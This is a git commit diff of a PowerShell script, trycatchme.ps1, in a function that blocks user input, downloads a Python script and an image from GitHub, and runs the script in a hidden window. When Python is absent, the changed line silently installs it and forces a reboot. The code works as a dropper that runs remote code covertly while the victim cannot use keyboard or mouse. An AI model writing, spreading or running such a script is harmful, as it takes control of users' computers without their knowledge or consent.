82cec2cb7a190d4b1c8f61eb58b6ef5b773137d5
M4rc333l <94375791+M4rc333l@users.noreply.github.com>
2024-06-24 14:46:12 +0200

    Update trycatchme.ps1

--- trycatchme.ps1
+++ trycatchme.ps1
@@ -11,7 +11,7 @@ function DisableUserInputAndRunScript() {
         Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Spongebob.png" -OutFile "Spongebob.png"
         Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/TryCatchMe.py" -OutFile "script.py"
         $p = &{python -V} 2>&1
-        $version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe"; Start-Process -FilePath "powershell" -ArgumentList "Start-Process 'Python-Install.exe' -ArgumentList '/passive InstallAllUsers=0 PrependPath=1' -NoNewWindow -Wait -WindowStyle Hidden" -WindowStyle Hidden -Wait; Remove-Item "Python-Install.exe"; $userInput::BlockInput($false); Restart-Computer} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }    } finally {
+        $version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe";Start-Process "Python-Install.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait; Remove-Item "Python-Install.exe"; $userInput::BlockInput($false); Restart-Computer} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }    } finally {
         $userInput::BlockInput($false)
     }
 }
